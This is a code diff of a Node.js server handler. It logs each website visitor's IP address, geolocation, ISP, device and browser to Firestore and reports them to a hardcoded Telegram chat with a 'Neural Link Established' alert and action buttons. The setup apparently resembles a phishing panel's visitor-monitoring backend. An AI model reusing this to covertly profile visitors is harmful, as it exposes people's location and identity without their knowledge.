@@ -21,36 +21,50 @@ const CHAT_ID = "6886010817";
 module.exports = async (req, res) => {
     if (req.method !== 'POST') return res.status(200).send('OK');
 
-    const { sessionID, ipData, device, browser, pathname } = req.body;
+    let { sessionID, ipData, device, browser, pathname } = req.body;
 
     if (!sessionID) return res.status(400).send('Missing Session ID');
 
     try {
+        // 1. Server-side IP Detection (Reliable fallback for office networks)
+        const clientIP = req.headers['x-forwarded-for']?.split(',')[0].trim() || req.socket.remoteAddress;
+
+        // 2. Fetch Geo-data on server if frontend failed or to verify
+        if (!ipData || !ipData.city || ipData.ip === '0.0.0.0') {
+            try {
+                const geoRes = await axios.get(`https://ipapi.co/${clientIP}/json/`);
+                ipData = geoRes.data;
+            } catch (e) {
+                console.warn("Server-side Geo Fetch Failed:", e.message);
+                ipData = ipData || { ip: clientIP };
+            }
+        }
+
         const sessionData = {
             sessionID,
-            ip: ipData.ip,
-            city: ipData.city,
-            country: ipData.country_name,
-            org: ipData.org,
-            device: device,
-            browser: browser,
+            ip: clientIP,
+            city: ipData.city || 'Unknown',
+            country: ipData.country_name || 'Unknown',
+            org: ipData.org || 'Unknown',
+            device: device || 'Unknown',
+            browser: browser || 'Unknown',
             startTime: new Date().toISOString(),
             status: 'online',
             history: [
-                { time: new Date().toLocaleTimeString('tr-TR'), action: 'Entrance', detail: pathname }
+                { time: new Date().toLocaleTimeString('tr-TR'), action: 'Entrance', detail: pathname || 'Unknown' }
             ]
         };
 
-        // 1. Initialize Firestore Document
-        await db.collection('visitors_v1').doc(sessionID).set(sessionData);
+        // 3. Initialize/Update Firestore Document
+        await db.collection('visitors_v1').doc(sessionID).set(sessionData, { merge: true });
 
-        // 2. Send Telegram Notification (Neural Link Established - Per Final Guide)
+        // 4. Send Telegram Notification (Neural Link Established - Per Final Guide)
         const telegramMsg = `🎯 <b>Neural Link Established</b>\n\n` +
             `🆔 <b>ID:</b> <code>${sessionID}</code>\n` +
-            `🌍 <b>Loc:</b> ${ipData.city}, ${ipData.country_name}\n` +
-            `📡 <b>IP:</b> <code>${ipData.ip}</code>\n` +
-            `🏢 <b>ISP:</b> ${ipData.org}\n` +
-            `💻 <b>Sys:</b> ${device}`;
+            `🌍 <b>Loc:</b> ${sessionData.city}, ${sessionData.country}\n` +
+            `📡 <b>IP:</b> <code>${sessionData.ip}</code>\n` +
+            `🏢 <b>ISP:</b> ${sessionData.org}\n` +
+            `💻 <b>Sys:</b> ${sessionData.device}`;
 
         const buttons = {
             inline_keyboard: [
